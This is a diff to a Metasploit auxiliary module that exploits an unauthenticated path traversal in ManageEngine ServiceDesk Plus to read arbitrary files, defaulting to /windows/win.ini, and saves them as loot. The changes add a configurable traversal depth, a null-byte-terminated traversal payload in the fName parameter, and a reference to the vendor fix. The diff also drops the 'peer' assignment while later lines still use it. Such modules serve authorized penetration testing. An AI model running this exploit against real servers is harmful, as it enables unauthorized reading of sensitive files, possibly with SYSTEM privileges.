@@ -18,12 +18,13 @@ class Metasploit3 < Msf::Auxiliary
         This module exploits an unauthenticated path traversal vulnerability found in ManageEngine
         ServiceDesk Plus build 9110 and lower. The module will retrieve any file on the filesystem
         with the same privileges as Support Center Plus is running. On Windows, files can be retrieved
-        with SYSTEM privileges.
+        with SYSTEM privileges. The issue has been resolved in ServiceDesk Plus build 91111 (issue SD-60283).
       },
       'License'        => MSF_LICENSE,
       'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
       'References'     =>
         [
+          ['URL', 'https://www.manageengine.com/products/service-desk/readme-9.1.html'],
         ],
       'DisclosureDate' => "Oct 03 2015"
     ))
@@ -31,6 +32,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8080),
+        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ]),
         OptString.new('TARGETURI', [true, 'The base path to the ServiceDesk Plus installation', '/']),
         OptString.new('FILE', [true, 'The file to retrieve', '/windows/win.ini'])
       ], self.class)
@@ -38,7 +40,9 @@ class Metasploit3 < Msf::Auxiliary
 
   def run_host(ip)
     uri = target_uri.path
-    peer = "#{ip}:#{rport}"
+    traversal = "../" * datastore['DEPTH']
+    filename = datastore['FILE']
+    filename = filename[1, filename.length] if filename =~ /^\//
 
     vprint_status("#{peer} - Retrieving file #{datastore['FILE']}")
     res = send_request_cgi({
@@ -47,7 +51,7 @@ class Metasploit3 < Msf::Auxiliary
       'vars_get' =>
       {
         'module' => 'support',
-        'fName' => "/../../../../../../../../../../../../#{datastore['FILE']}\x00",
+        'fName' => "#{traversal}#{filename}\x00",
       }
     })
 
@@ -61,15 +65,14 @@ class Metasploit3 < Msf::Auxiliary
       elsif res.body =~ /Loding domain list To login AD authentication or local Authentication/
         vprint_error("#{peer} - The installed version of ManageEngine ServiceDesk Plus is not vulnerable!")
       else
-        data = res.body
         p = store_loot(
           'manageengine.servicedeskplus',
           'application/octet-stream',
           ip,
-          data,
-          datastore['FILE']
+          res.body,
+          filename
         )
-        print_good("#{peer} - [ #{datastore['FILE']} ] loot stored as [ #{p} ]")
+        print_good("#{peer} - File saved in: #{p}")
       end
     else
         vprint_error("#{peer} - Server returned #{res.code.to_s}")
